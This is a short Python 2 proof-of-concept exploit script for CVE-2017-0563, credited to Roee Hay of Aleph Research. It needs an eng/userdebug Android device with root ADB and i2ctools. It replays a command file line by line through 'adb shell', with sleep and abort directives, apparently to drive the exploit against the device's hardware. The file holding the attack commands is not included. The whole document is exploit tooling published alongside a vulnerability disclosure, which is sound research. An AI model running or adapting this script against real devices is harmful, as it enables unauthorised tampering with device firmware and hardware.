#
# PoC for CVE-2017-0563
# Roee Hay / Aleph Research / HCL Technologies
#
# 1. Only works on a eng/userdebug device. 
# 2. Requires root ADB
# 3. Requires i2ctools to be placed under /data/local/tmp
#

import os
import sys
import time
import subprocess


def main():
    
    if len(sys.argv) < 2:
        return
    
    fw = file(sys.argv[1]).read()
        
    for x in fw.split("\n"):
        if 0 == len(x):
            continue
         
        if x[0] == '#':         
            continue
            
        if x[0] == '@':
            time.sleep(float(x[1:])/1000)
            continue

        if x[0] == '!':
            sys.exit(1)

        print x
        sys.stdout.flush()
    
        print system("adb shell " + x)
                
def system(cmd):
    return subprocess.check_output(cmd, stderr=subprocess.STDOUT)
main()
